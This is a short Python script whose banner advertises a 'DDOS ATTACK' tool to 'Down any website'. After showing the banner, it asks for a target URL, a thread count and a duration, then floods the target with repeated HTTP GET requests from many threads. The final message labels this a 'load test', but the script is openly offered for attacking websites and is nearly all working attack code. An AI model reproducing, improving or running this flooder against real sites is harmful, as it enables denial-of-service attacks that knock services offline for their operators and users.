import sys
import time 

def animated(text):
  for x in text:
    sys.stdout.write(x)
    sys.stdout.flush()
    time.sleep(0.005)






logo = '''

                                            
                                            
\033[1;34m___    __   ____   ________  ___________    
`MM    d'  @6MMMMb  `MMMMMMMb.`MM`MMMMMMMb.  
 MM   d'  8P    Y8  MM    `Mb MM MM    `Mb  
 MM  d'  6M      Mb MM     MM MM MM     MM  
 MM d'   MM      MM MM    .M9 MM MM     MM  
 MMd'    MM      MM MMMMMMM(  MM MM    .M9  
 MMYM.   MM      MM MM    `Mb MM MMMMMMM9'  
 MM YM.  MM      MM MM     MM MM MM  \M\    
 MM  YM. YM      M9 MM     MM MM MM   \M\   
 MM   YM. 8b    d8  MM    .M9 MM MM    \M\  
_MM_   YM._YMMMM9  _MMMMMMM9'_MM_MM_    \M\_
                                            
                                            
                                            

                                             
   * CREDIT SK KOBIR VAI *
    ** DDOS ATTACK TOIL**
    😈😈😈😈😈😈😈😈😈😈😈
     ☠️ Down any website ☠️
    
    
    
    '''
animated(logo)
import requests
import threading
import time

def send_requests(url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            response = requests.get(url)
            print(f"[{threading.current_thread().name}] Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[{threading.current_thread().name}] Error: {e}")

def start_load_test():
    url = input("ENTER TERGET WEBSITE URL:").strip()
    threads_count = int(input("Enter number of threads (e.g. 100): "))
    duration = int(input("Enter duration in seconds (e.g. 60): "))

    threads = []
    for i in range(threads_count):
        t = threading.Thread(target=send_requests, args=(url, duration), name=f"Thread-{i+1}")
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("\n✅ Load test finished.")

if __name__ == "__main__":
    start_load_test()